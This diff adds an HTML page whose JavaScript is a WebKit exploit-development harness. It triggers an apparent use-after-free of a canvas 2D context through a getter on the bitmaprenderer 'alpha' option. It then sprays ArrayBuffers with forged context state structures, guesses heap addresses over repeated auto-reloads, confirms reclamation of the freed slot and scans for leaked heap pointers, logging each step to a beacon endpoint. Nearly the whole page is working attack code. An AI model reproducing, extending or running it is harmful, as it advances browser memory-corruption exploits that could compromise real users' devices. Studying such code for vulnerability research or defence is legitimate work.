@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V923D - verify reclaim (V569-style) + safe-call on forged/zeroed slot</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #3fb950; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V923D - prove reclaim, then test beginPath/save/roundRect on a reclaimed slot</h1>
+
+<p class="key">
+<b>V923C result:</b> every call (<code>beginPath</code>, <code>save</code>) crashed 2/2 across all AB counts and
+even with no spray &mdash; so zeroed AB spray did not yield a safely usable reclaimed context. V923D first
+reproduces V569's proven pattern: spray AB(768) <b>pre-filled</b> with a forged state stack
+(<code>m_buffer=self+128, m_capacity=1, m_size=1</code>, marker <code>lineWidth</code> at state+48 = AB+176),
+then read <code>CTX.lineWidth</code> (V569 self-probe, base guessed per load from a small window).
+If reclaim is proven (<code>HIT</code>), it then tests <code>beginPath()</code>, <code>save()</code> canary, and
+<code>roundRect()</code> on the <b>forged</b> slot (no vtable dispatch; state stack valid). A <code>LEAK</code>
+means WebKit wrote a heap pointer at <code>context+48</code> into an AB we can read.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v923d_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v923d_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v923d_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V923D-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+var F64 = new Float64Array(1), U32 = new Uint32Array(F64.buffer);
+function hexOf(x) { F64[0] = x; return '0x' + ('00000000' + U32[1].toString(16)).slice(-8) + ('00000000' + U32[0].toString(16)).slice(-8); }
+function hexAddr(a) { return (isFinite(a) && a >= 0) ? '0x' + Math.floor(a).toString(16) : 'nan'; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+
+var VIEWS = null, KEEP = null, DVIEWS = null, CTX = null, HASRR = false;
+var N = 200;
+var WORDS = 192;
+var CANARY_WORD = 148; /* +592 */
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+function reloadSoon(ms) { setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms); }
+
+function trigger(canvas, nsaves) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try {
+        ctx.lineWidth = 3.14159; ctx.miterLimit = 7.77; ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222; ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+/* V569-style self-forged spray. Each AB assumes its own address = base + i*768.
+   +32  m_canvas = nonzero
+   +112 m_buffer = self+128 (inline State buffer)
+   +120 m_capacity = 1
+   +124 m_size = 1
+   +176 state.lineWidth marker = 9000+i  (state+48, state at +128)
+   +384 m_unrealizedSaveCount left 0 initially
+*/
+function sprayForged(base, count) {
+  var abs = new Array(count), views = new Array(count), dvs = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    var dv = new DataView(ab);
+    var selfAddr = base + i * 768;
+    var bufAddr = selfAddr + 128;
+    dv.setUint32(32, 0x41414141, true);
+    dv.setUint32(36, 0x00000001, true);
+    dv.setUint32(112, (bufAddr >>> 0), true);
+    dv.setUint32(116, (Math.floor(bufAddr / 0x100000000) >>> 0), true);
+    dv.setUint32(120, 1, true);  /* capacity */
+    dv.setUint32(124, 1, true);  /* size */
+    dv.setUint32(384, 0, true);  /* m_unrealizedSaveCount (V569 offset) */
+    dv.setFloat64(176, 9000 + i, false);
+    abs[i] = ab; views[i] = new Uint32Array(ab); dvs[i] = dv;
+  }
+  KEEP = abs; VIEWS = views; DVIEWS = dvs;
+}
+
+/* patch every AB to point m_buffer at a chosen target (T-48 so lineWidth reads T). */
+function patchBufferTo(target) {
+  var lo = target % 0x100000000;
+  var hi = Math.floor(target / 0x100000000);
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    v[28] = lo; v[29] = hi; v[30] = 1; v[31] = 1;
+  }
+}
+
+function scanView(i, maxHits) {
+  var hits = [], v = VIEWS[i]; if (!v) return hits;
+  for (var w = 0; w < WORDS; w++) { if (v[w] !== 0) { hits.push([w, v[w]]); if (hits.length >= maxHits) return hits; } }
+  return hits;
+}
+function hitStr(hits) {
+  var a = []; for (var i = 0; i < hits.length; i++) {
+    if (hits[i].length === 3) a.push('v' + hits[i][0] + '/w' + hits[i][1] + '=0x' + hits[i][2].toString(16));
+    else a.push('w' + hits[i][0] + '=0x' + hits[i][1].toString(16));
+  } return a.join(',');
+}
+
+function step(tag, label, fn) {
+  var st = lsGet('stage') || 'probe';
+  var t = bumpTry();
+  var meta = 'stage=' + st + ',try=' + t;
+  bks(tag + '-PRE', meta + ',' + label);
+  say(tag + ' try ' + t + ' ' + label);
+  lsSet('pending', st + ':' + tag + ':' + label);
+  var res, err = null;
+  try { res = fn(); } catch (e) { err = e; }
+  lsDel('pending');
+  if (err) { bks(tag + '-ERR', meta + ',' + errOf(err)); say(tag + ' threw ' + errOf(err)); return { ok: false, err: err }; }
+  bks(tag + '-OK', meta);
+  return { ok: true, res: res };
+}
+
+/* guess window for self-probe: try a few plausible heap bases per load, advancing by window */
+function guessBase(load) {
+  /* V569 used 0x200000000; also try other low heap regions. One guess per load, stride = N*768. */
+  var anchors = [0x200000000, 0x180000000, 0x240000000, 0x280000000, 0x1c0000000, 0x300000000];
+  var window = N * 768;
+  var aidx = Math.floor((load - 1) / 40) % anchors.length;
+  var off = ((load - 1) % 40) * window;
+  return anchors[aidx] + off;
+}
+
+function main() {
+  var q = location.search;
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('stage'); lsDel('tries'); lsDel('hitBase'); lsDel('hitIdx');
+    bks('RESET', 'cleared'); say('cleared. reopen ?op=auto'); return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > 500) { bks('GIVEUP', 'loads=' + loads); say('give up - reset'); return; }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    var t = triesOf();
+    bks('CRASH', 'pending=' + pend + ',try=' + t + ',load=' + loads);
+    say('CRASH pending=' + pend + ' try=' + t);
+    /* a crash during probe = bad guess (expected) or real crash; advance guess */
+    if (lsGet('stage') === 'probe') { lsDel('tries'); /* next load tries next base */ }
+    else if (t >= 2) {
+      bks('BLACKLIST', 'pending=' + pend);
+      var st0 = lsGet('stage') || 'posthit';
+      if (st0 === 'bp') { lsSet('stage', 'save'); lsDel('tries'); }
+      else if (st0 === 'save') { lsSet('stage', 'rr'); lsDel('tries'); }
+      else { lsSet('stage', 'done'); }
+    }
+  }
+
+  if (lsGet('phase') === 'done' || lsGet('stage') === 'done') { say('done. reset with ?reset=1'); return; }
+
+  var base = guessBase(loads);
+
+  bks('BOOT', 'load=' + loads + ',base=' + hexAddr(base) + ',N=' + N);
+  say('probe base=' + hexAddr(base));
+
+  var canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas); window._v923dcanvas = canvas;
+
+  var tr = trigger(canvas, 32);
+  if (!tr.saved) { bks('ERR', 'trigger-failed'); reloadSoon(1200); return; }
+  CTX = tr.saved; HASRR = tr.hasRR;
+  bks('PREFLIGHT', 'rr=' + HASRR);
+
+  sprayForged(base, N);
+  bks('ARM', 'abs=' + N + ',base=' + hexAddr(base));
+
+  /* V569 self-probe: read lineWidth. Wrong base => forged m_buffer is garbage => process crash
+     (pending seen next reload). Right base + reclaim => lw matches a marker. */
+  bks('LW-PRE', 'base=' + hexAddr(base));
+  lsSet('pending', 'probe:LW:lineWidth,base=' + hexAddr(base));
+  var lw, lwErr = null;
+  try { lw = CTX.lineWidth; } catch (e) { lwErr = e; }
+  lsDel('pending');
+  if (lwErr) {
+    bks('LW-CRASHED', 'base=' + hexAddr(base) + ',' + errOf(lwErr));
+    lsDel('tries');
+    reloadSoon(250);
+    return;
+  }
+  bks('LW-OK', 'lw=' + lw + ',base=' + hexAddr(base));
+  say('lineWidth=' + lw);
+
+  var idx = Math.round(lw - 9000);
+  if (!(idx >= 0 && idx < N)) {
+    bks('NOMATCH', 'lw=' + lw + ',base=' + hexAddr(base));
+    say('no match, next guess');
+    lsDel('tries');
+    reloadSoon(250);
+    return;
+  }
+
+  /* ---- HIT: same load, slot reclaimed by AB[idx]. Do everything now. ---- */
+  var hitAddr = base + idx * 768;
+  bks('HIT', 'idx=' + idx + ',hit=' + hexAddr(hitAddr) + ',base=' + hexAddr(base) + ',lw=' + lw);
+  say('HIT AB#' + idx + ' addr=' + hexAddr(hitAddr));
+
+  /* (1) beginPath — non-virtual, m_path.clear(); Path is at +48 in our layout assumption */
+  var bp = step('BP', 'beginPath', function () { CTX.beginPath(); });
+  if (!bp.ok) { bks('STOP', 'bp-failed'); return; }
+  bks('BPSURV', 'hit=' + hexAddr(hitAddr));
+
+  /* (2) save() canary — ++m_unrealizedSaveCount; scan all ABs for new non-forged writes */
+  var sv = step('SAVE', 'save-canary', function () { CTX.save(); });
+  if (!sv.ok) { bks('STOP', 'save-failed'); return; }
+  var ch = [];
+  for (var i = 0; i < VIEWS.length; i++) {
+    var v = VIEWS[i];
+    for (var w = 0; w < WORDS; w++) {
+      if (v[w] === 0) continue;
+      /* ignore known forged fields: +32(8),+112(28),+116(29),+120(30),+124(31),+176(44/45),+384(96) */
+      if (w === 8 || w === 9 || w === 28 || w === 29 || w === 30 || w === 31 || w === 44 || w === 45 || w === 96) continue;
+      ch.push([i, w, v[w]]);
+      if (ch.length >= 20) break;
+    }
+    if (ch.length >= 20) break;
+  }
+  bks('CANARY', 'n=' + ch.length + ',' + hitStr(ch));
+  say('canary hits=' + ch.length + ' ' + hitStr(ch));
+
+  /* (3) roundRect — gate-free; first moveTo -> ensureCairoPath writes cairo_t* at +48 (word 12) */
+  if (!HASRR) { bks('NORR', 'x'); lsSet('phase', 'done'); return; }
+  var rr = step('RR', 'roundRect(10,10,100,100,5)', function () { CTX.roundRect(10, 10, 100, 100, 5); });
+  if (!rr.ok) { bks('STOP', 'rr-failed'); return; }
+
+  /* scan the HIT view first, then all views, for heap pointer qwords */
+  function findPtr() {
+    var order = [idx]; for (var k = 0; k < VIEWS.length; k++) if (k !== idx) order.push(k);
+    for (var oi = 0; oi < order.length; oi++) {
+      var vi = order[oi], v = VIEWS[vi];
+      for (var w = 0; w + 1 < WORDS; w += 2) {
+        if (w === 44) continue; /* marker */
+        var lo = v[w], hi = v[w + 1];
+        if (lo === 0 && hi === 0) continue;
+        /* skip forged fields */
+        if (w === 8 || w === 28 || w === 30 || w === 96) continue;
+        var val = hi * 0x100000000 + lo;
+        if (val > 0x10000 && val < 0x1000000000000 && val !== 0x4141414100000001 && val < 0x100000000 || (val >= 0x100000000 && val < 0x1000000000000)) {
+          /* accept plausible heap/code pointers, reject small forged junk */
+          if (val > 0x100000 && !(w === 44)) return { v: vi, w: w, val: val };
+        }
+      }
+    }
+    return null;
+  }
+  var best = findPtr();
+  if (best) {
+    var cls = (best.val >= 0x800000000 && best.val < 0x900000000) ? 'wk-window' : (best.val >= 0x100000000 ? 'heap>4G' : 'heap<4G');
+    bks('LEAK', 'v=' + best.v + ',w=' + best.w + ',P=' + hexAddr(best.val) + ',cls=' + cls);
+    say('LEAK P=' + hexAddr(best.val) + ' w=' + best.w + ' ' + cls);
+  } else {
+    var d = 'hit=' + idx + ':' + hitStr(scanView(idx, 18));
+    for (var k = 0; k < Math.min(N, 4); k++) d += ' v' + k + ':' + hitStr(scanView(k, 8));
+    bks('NOWRITE', d.slice(0, 440));
+    say('NOWRITE ' + d.slice(0, 160));
+  }
+  lsSet('phase', 'done');
+  bks('DONE', 'hit=' + hexAddr(hitAddr));
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
